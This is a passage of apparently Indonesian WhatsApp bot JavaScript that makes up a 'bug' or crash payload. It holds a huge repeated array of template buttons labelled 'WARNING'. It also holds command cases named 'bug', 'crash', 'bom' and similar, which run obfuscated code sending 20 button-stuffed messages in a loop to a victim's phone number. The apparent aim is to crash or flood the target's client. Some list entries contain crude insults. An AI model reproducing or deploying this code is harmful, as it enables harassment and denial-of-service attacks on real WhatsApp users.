{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quoted: lep }
]})
}}
break
case 'aduhcoy':
if (!itsMediablo) return
touchmebre = [
{
title: `🌷 DANIMAKER 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
diablo.sendListMsg(m.chat, `🌷 DANIMAKER 🌷`, diablo.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break

case '🌷':
   case '🗿':
      case '🔥':
         case 'banned':
case 'santet':
case 'bug':
case 'troli':
case 'bom':
case 'mental':
case 'crash':
case 'ganas':
case 'button':
case 'trava':
case 'katalog':
case 'bugmex':
case 'bugsuhu':
case 'bugjago':
case 'bugdarkness':
case 'bugwaifu':
case 'bugbully':
case 'bugslebew':
case 'bugneko':
case 'bughentai': const _0x9b73d7=_0x268f;function _0x16ca(){const _0x174fe6=['☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','1301419blsWFD','6932mTzwKV','BUG\x20BY\x20CYCLONE','8410380bCGJGY','157322kyamfD','211CGbyZQ','2418PETmGu','290NjpjKy','128910NzpElc','sendMessage','62368OiCTSf','https://www.whatsapp.com/otp/copy/','6NwCzzo','SUCCES\x20✅','reply','170JTeEvp','99XnyyEA'];_0x16ca=function(){return _0x174fe6;};return _0x16ca();}function _0x268f(_0x1886bf,_0x4cbe97){const _0x16ca4e=_0x16ca();return _0x268f=function(_0x268f42,_0xaf1515){_0x268f42=_0x268f42-0xff;let _0x4604b8=_0x16ca4e[_0x268f42];return _0x4604b8;},_0x268f(_0x1886bf,_0x4cbe97);}(function(_0x129aa0,_0x4ae1d3){const _0x517830=_0x268f,_0x2b387=_0x129aa0();while(!![]){try{const _0x32af14=parseInt(_0x517830(0x10e))/0x1*(parseInt(_0x517830(0x10f))/0x2)+parseInt(_0x517830(0xff))/0x3+-parseInt(_0x517830(0x10a))/0x4*(parseInt(_0x517830(0x106))/0x5)+-parseInt(_0x517830(0x103))/0x6*(-parseInt(_0x517830(0x109))/0x7)+parseInt(_0x517830(0x101))/0x8*(parseInt(_0x517830(0x107))/0x9)+-parseInt(_0x517830(0x110))/0xa*(-parseInt(_0x517830(0x10d))/0xb)+-parseInt(_0x517830(0x10c))/0xc;if(_0x32af14===_0x4ae1d3)break;else _0x2b387['push'](_0x2b387['shift']());}catch(_0x370954){_0x2b387['push'](_0x2b387['shift']());}}}(_0x16ca,0x36dc9));{if(!isGroup)return diablobotwhatsapp[_0x9b73d7(0x105)]('sorry\x20anda\x20sepertinya\x20bukan\x20pemilik\x20bot');txts=_0x9b73d7(0x104),diablobotwhatsapp['reply'](txts);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='20',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x9b73d7(0x100)](num,{'text':_0x9b73d7(0x10b),'templateButtons':[{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IA